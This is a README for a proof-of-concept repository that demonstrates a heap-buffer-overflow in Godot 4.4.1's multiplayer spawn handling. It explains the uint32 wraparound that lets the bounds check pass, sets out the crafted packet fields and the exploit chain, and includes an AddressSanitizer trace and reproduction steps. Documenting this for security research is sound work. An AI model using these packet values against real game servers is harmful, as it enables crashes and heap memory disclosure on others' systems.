# Godot OOB Spawn Exploit (CVE PoC)

**A proof-of-concept demonstrating a heap-buffer-overflow vulnerability in Godot Engine 4.4.1-stable's multiplayer spawn system.**

The bug lives in `SceneReplicationInterface::on_spawn_receive()` (`scene_replication_interface.cpp`). A uint32 overflow in the bounds check allows a connected client to trigger an out-of-bounds heap read by sending a crafted ENet packet — no engine modification needed.

---

## The Vulnerability

### Root Cause

In `scene_replication_interface.cpp`, the `on_spawn_receive()` function parses a SPAWN command packet with this structure:

```
[0]    cmd (1 byte)
[1]    scene_id (1 byte)
[2-5]  node_target / cache_id (uint32 LE)
[6-9]  net_id (uint32 LE)
[10-13] sync_len (uint32 LE)     ← the trigger
[14-17] name_len (uint32 LE)
[18+]  sync_ids + name (variable)
```

The bounds check computes:

```cpp
uint32_t sync_len;  // from packet[10-13]
uint32_t name_len;  // from packet[14-17]
uint32_t remaining = packet_size - 18;
uint32_t sum = sync_len * 4 + name_len;

if (sum > remaining) { /* reject */ }
```

When `sync_len = 0x40000001`, the multiplication `sync_len * 4` wraps in uint32:

```
0x40000001 * 4 = 0x100000004 → wraps to 0x00000004 (4)
4 + 20 (name_len) = 24
remaining = 42 - 18 = 24
24 > 24 → false → PASSES ✓
```

### The Math

| Field | Value |
|---|---|
| `sync_len` | `0x40000001` (1,073,741,825) |
| `sync_len * 4` (uint32) | wraps to **4** |
| `name_len` | 20 |
| Bounds check | `24 > 24` = **false → PASSES** |
| Loop iterations | **1,073,741,825** (reading 4 bytes each) |
| OOB starts at | iteration 7 (reads past the 42-byte buffer) |

The loop then reads `sync_len * 4` bytes from the packet, iterating ~1 billion times and reading far past the allocated 42-byte buffer.

---

## Exploit Chain

The exploit requires **no C++ engine modification** — Godot exposes `ENetPacketPeer.send()` to GDScript, so raw ENet packets can be injected directly.

```
Client connects ──→ Server delegates ExploitSpawner authority
         │
         ▼
SIMPLIFY_PATH sent ──→ Registers cache entry for Game/ExploitSpawner
  (cmd=1, cache_id=0xDEADBEEF)   (server accepts even with fake MD5)
         │
         ▼
Malformed SPAWN sent ──→ uint32 overflow bypasses bounds check
  (cmd=4, sync_len=0x40000001)   → loop reads OOB on the heap
         │
         ▼
ASAN detects ──→ heap-buffer-overflow at decode_uint32
  "0 bytes to the right of 42-byte region"
```

### Key Files

| File | Purpose |
|---|---|
| `godot-3d-multiplayer-template/scripts/exploit/oob_spawn_exploit.gd` | The exploit GDScript — crafts and sends SIMPLIFY_PATH + malformed SPAWN |
| `godot-3d-multiplayer-template/scenes/game.tscn` | Modified scene with `ExploitSpawner` (MultiplayerSpawner) and `OOBExploit` nodes |
| `godot-3d-multiplayer-template/scripts/network/multiplayer_manager.gd` | Authority delegation: server sets ExploitSpawner authority to connecting client |

---

## ASAN Evidence (Symbolized)

When the server runs on a Godot 4.4.1 build with AddressSanitizer enabled **and debug symbols**:

```
=================================================================
==36508==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x11e45104743a
READ of size 1 at 0x11e45104743a thread T0
    #0 0x7ff6e52a5d88 in decode_uint32
        C:\...\godot-4.4.1\core\io\marshalls.h:172
    #1 0x7ff6e52ac9e7 in SceneReplicationInterface::on_spawn_receive(int, unsigned char const *, int)
        C:\...\godot-4.4.1\modules\multiplayer\scene_replication_interface.cpp:590  ← VULNERABILITY
    #2 0x7ff6e5264f43 in SceneMultiplayer::_process_packet(int, unsigned char const *, int)
        C:\...\godot-4.4.1\modules\multiplayer\scene_multiplayer.cpp:241
    #3 0x7ff6e527365e in SceneMultiplayer::poll(void)
        C:\...\godot-4.4.1\modules\multiplayer\scene_multiplayer.cpp:137
    #4 0x7ff6e80482b5 in SceneTree::process(double)
        C:\...\godot-4.4.1\scene\main\scene_tree.cpp:571
    #5 0x7ff6e3635866 in Main::iteration(void)
        C:\...\godot-4.4.1\main\main.cpp:4529
    #6 0x7ff6e3524529 in OS_Windows::run(void)
        C:\...\godot-4.4.1\platform\windows\os_windows.cpp:2075
    #7 0x7ff6e34ff340 in widechar_main(int, wchar_t **)
        C:\...\godot-4.4.1\platform\windows\godot_windows.cpp:96
    #8 0x7ff6e34fefe7 in _main(void)
        C:\...\godot-4.4.1\platform\windows\godot_windows.cpp:122
    #9 0x7ff6e34ff438 in main
        C:\...\godot-4.4.1\platform\windows\godot_windows.cpp:136

0x11e45104743a is located 0 bytes to the right of 42-byte region
allocated by thread T0 here:
    #0 0x7ff6e35f59b2 in malloc
        ...\compiler-rt\lib\asan\asan_malloc_win.cpp:124
    #1 0x7ff6e4251b9b in enet_malloc
        C:\...\godot-4.4.1\thirdparty\enet\callbacks.c:40
    #2 0x7ff6e4246255 in enet_packet_create
        C:\...\godot-4.4.1\thirdparty\enet\packet.c:33
    #3 0x7ff6e42479b8 in enet_peer_queue_incoming_command
        C:\...\godot-4.4.1\thirdparty\enet\peer.c:959
    #4 0x7ff6e424e1f6 in enet_protocol_handle_send_reliable
        C:\...\godot-4.4.1\thirdparty\enet\protocol.c:462
    #5 0x7ff6e424d90d in enet_protocol_handle_incoming_commands
        C:\...\godot-4.4.1\thirdparty\enet\protocol.c:1155
    #6 0x7ff6e424f62a in enet_protocol_receive_incoming_commands
        C:\...\godot-4.4.1\thirdparty\enet\protocol.c:1281
    #7 0x7ff6e424af96 in enet_host_service
        C:\...\godot-4.4.1\thirdparty\enet\protocol.c:1845
    #8 0x7ff6e4228462 in ENetConnection::service(int, ...)
        C:\...\godot-4.4.1\modules\enet\enet_connection.cpp:178
    #9 0x7ff6e424098e in ENetMultiplayerPeer::poll(void)
        C:\...\godot-4.4.1\modules\enet\enet_multiplayer_peer.cpp:198

SUMMARY: AddressSanitizer: heap-buffer-overflow
    C:\...\godot-4.4.1\core\io\marshalls.h:172 in decode_uint32
Shadow bytes around the buggy address:
=>0x0418dae08e80: fa fa 00 00 00 00 00[02]fa fa fd fd fd fd fd fd
==36508==ABORTING
```

Full logs in `.omo/evidence/`:
- `server-symbolized-err.txt` — **full symbolized ASAN report** with complete call chain
- `server-v3-err.txt` — earlier unsymbolized ASAN report
- `task-9-godot-oob-spawn-exploit.md` — overflow math analysis

---

## How to Reproduce

### Prerequisites

1. **Godot 4.4.1-stable** built with MSVC + ASAN:
   ```powershell
   scons platform=windows target=editor dev_build=yes use_asan=yes
   ```
2. The `godot-3d-multiplayer-template` project (included)

### Steps

1. **Open the project** in the Godot editor once to import assets
2. **Run as server**: `godot.windows.editor.dev.x86_64.san.exe --path godot-3d-multiplayer-template --headless`
3. **Run as client**: `godot.windows.editor.dev.x86_64.san.exe --path godot-3d-multiplayer-template`
4. Client connects → exploit fires automatically → server ASAN catches the OOB

> The `-template` project has an `auto_connect.gd` autoload for quick testing.

---

## What Was NOT Modified

- **No engine C++ source was modified** — the exploit is purely GDScript
- **No Godot binary was patched**
- **No Netfox addon code was touched**
- This is an **offensive PoC only** — no fix is attempted

---

## Disclaimer

This repository is for **educational and security research purposes only**. The vulnerability has been demonstrated against Godot 4.4.1-stable. Use responsibly.
